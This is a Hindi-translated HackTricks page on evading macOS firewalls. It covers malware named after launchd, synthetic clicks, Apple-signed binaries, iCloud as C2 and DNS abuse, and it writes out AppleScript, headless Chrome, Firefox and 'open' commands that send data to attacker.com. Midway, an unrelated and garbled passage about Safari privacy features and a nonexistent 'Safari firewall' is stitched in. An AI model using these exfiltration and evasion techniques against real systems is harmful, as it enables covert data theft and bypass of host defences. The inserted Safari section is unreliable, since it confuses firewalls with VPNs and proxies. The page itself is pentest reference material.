# macOS फ़ायरवॉल को छलना

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का उपयोग** करना चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष संग्रह [**NFTs**](https://opensea.io/collection/the-peass-family)
* प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **फ़ॉलो** करें मुझे **Twitter** [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## पाए गए तकनीक

निम्नलिखित तकनीकों को कुछ macOS फ़ायरवॉल ऐप्स में काम करते पाया गया है।

### व्हाइटलिस्ट नाम का दुरुपयोग

* उदाहरण के लिए मैलवेयर को **`launchd`** की तरह विख्यात macOS प्रक्रियाओं के नाम से बुलाएं

### सिंथेटिक क्लिक

* अगर फ़ायरवॉल उपयोगकर्ता से अनुमति के लिए पूछता है तो मैलवेयर को **अनुमति देने के लिए क्लिक करें**

### **Apple साइन की गई बाइनरी का उपयोग करें**

* जैसे **`curl`**, लेकिन अन्य भी जैसे **`whois`**

### विख्यात Apple डोमेन

फ़ायरवॉल को विख्यात Apple डोमेनों जैसे **`apple.com`** या **`icloud.com`** कनेक्शन की अनुमति दे सकता है। और iCloud को C2 के रूप में उपयोग किया जा सकता है।

### सामान्य छल

फ़ायरवॉल को छलने के लिए कुछ विचार

### अनुमति दिए गए ट्रैफ़िक की जांच करें

अनुमति दिए गए ट्रैफ़िक को जानना आपको पोटेंशियली व्हाइटलिस्टेड डोमेन या जिन एप्लिकेशन्स को उन्हें एक्सेस करने की अनुमति है, की पहचान में मदद करेगा।
```bash
lsof -i TCP -sTCP:ESTABLISHED
```
### DNS का दुरुपयोग

DNS संक्रमण **`mdnsreponder`** साइन की गई एप्लिकेशन के माध्यम से किया जाता है जिसे संभावतः DNS सर्वरों से संपर्क करने की अनुमति होगी।

<figure><img src="../../.gitbook/assets/image (1) (1) (6).png" alt=""><figcaption></figcaption></figure>

### ब्राउज़र ऐप के माध्यम से

* **oascript**
```applescript
tell application "Safari"
run
tell application "Finder" to set visible of process "Safari" to false
make new document
set the URL of document 1 to "https://attacker.com?data=data%20to%20exfil
end tell
```
* गूगल क्रोम

{% code overflow="wrap" %}
```bash
"Google Chrome" --crash-dumps-dir=/tmp --headless "https://attacker.com?data=data%20to%20exfil"
```
{% endcode %}

* फ़ायरफ़ॉक्स
```bash
firefox-bin --headless "https://attacker.com?data=data%20to%20exfil"
```
# Safari

Safari एक डिफ़ॉल्ट वेब ब्राउज़र है जो macOS पर उपलब्ध है। यह वेबसाइटों को खोलने, नेविगेट करने और इंटरनेट पर सामग्री देखने की सुविधा प्रदान करता है। Safari कई सुरक्षा और गोपनीयता फ़ीचर्स के साथ आता है जो उपयोगकर्ताओं को सुरक्षित रखने में मदद करते हैं।

## Safari की सुरक्षा फ़ीचर्स

### 1. Intelligent Tracking Prevention (ITP)

ITP एक सुरक्षा फ़ीचर है जो ट्रैकिंग कुकीज़ को रोकता है और उपयोगकर्ताओं की गोपनीयता को सुरक्षित रखता है। यह वेबसाइटों को उपयोगकर्ताओं के ब्राउज़िंग डेटा को ट्रैक नहीं करने देता है।

### 2. Privacy Report

Safari में एक प्राइवेसी रिपोर्ट फ़ीचर है जो उपयोगकर्ताओं को उनकी ब्राउज़िंग गतिविधियों के बारे में जानकारी प्रदान करता है। यह उपयोगकर्ताओं को उनकी गोपनीयता को समझने और सुरक्षित रखने में मदद करता है।

### 3. Password Monitoring

Safari उपयोगकर्ताओं के पासवर्डों को मॉनिटर करने की क्षमता रखता है। यह उपयोगकर्ताओं को उनके पासवर्डों की सुरक्षा को सुनिश्चित करने में मदद करता है और उन्हें अगर कोई पासवर्ड लीक होता है तो सूचित करता है।

## Safari के फ़ायरवॉल को बाइपास करना

Safari के फ़ायरवॉल को बाइपास करने के लिए कुछ तकनीकें हैं जो आपको उच्च स्तर की गोपनीयता और अधिकारों तक पहुंच देती हैं। इनमें से कुछ तकनीकें निम्नलिखित हैं:

1. **Proxy सेट करें**: एक प्रॉक्सी सेट करके, आप अपने वेब ट्रैफ़िक को एक अन्य सर्वर के माध्यम से रूट कर सकते हैं और फ़ायरवॉल को बाइपास कर सकते हैं।

2. **VPN का उपयोग करें**: एक वीपीएन (VPN) का उपयोग करके, आप अपने इंटरनेट कनेक्शन को एक दूसरे सर्वर के माध्यम से रूट कर सकते हैं और फ़ायरवॉल को बाइपास कर सकते हैं।

3. **DNS टनलिंग**: DNS टनलिंग का उपयोग करके, आप अपने वेब ट्रैफ़िक को एक अन्य सर्वर के माध्यम से रूट कर सकते हैं और फ़ायरवॉल को बाइपास कर सकते हैं।

4. **वेब प्रॉक्सी**: एक वेब प्रॉक्सी का उपयोग करके, आप अपने वेब ट्रैफ़िक को एक अन्य सर्वर के माध्यम से रूट कर सकते हैं और फ़ायरवॉल को बाइपास कर सकते हैं।

ये तकनीकें आपको Safari के फ़ायरवॉल को बाइपास करने में मदद कर सकती हैं और आपको अधिकारों तक पहुंचने में सक्षम बना सकती हैं।
```bash
open -j -a Safari "https://attacker.com?data=data%20to%20exfil"
```
### प्रक्रिया इंजेक्शन के माध्यम से

यदि आप किसी प्रक्रिया में कोड **इंजेक्शन कर सकते हैं** जो किसी भी सर्वर से कनेक्ट करने की अनुमति देती है, तो आप फ़ायरवॉल सुरक्षा को छोड़ सकते हैं:

{% content-ref url="macos-proces-abuse/" %}
[macos-proces-abuse](macos-proces-abuse/)
{% endcontent-ref %}

## संदर्भ

* [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी कंपनी को **HackTricks में विज्ञापित** देखना चाहते हैं? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने की अनुमति** चाहिए? [**सदस्यता योजनाएं**](https://github.com/sponsors/carlospolop) की जांच करें!
* खोजें [**The PEASS Family**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**NFT**](https://opensea.io/collection/the-peass-family) संग्रह
* प्राप्त करें [**आधिकारिक PEASS और HackTricks swag**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**Discord समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर **फ़ॉलो** करें [**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें द्वारा PRs सबमिट करके** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **को।**

</details>
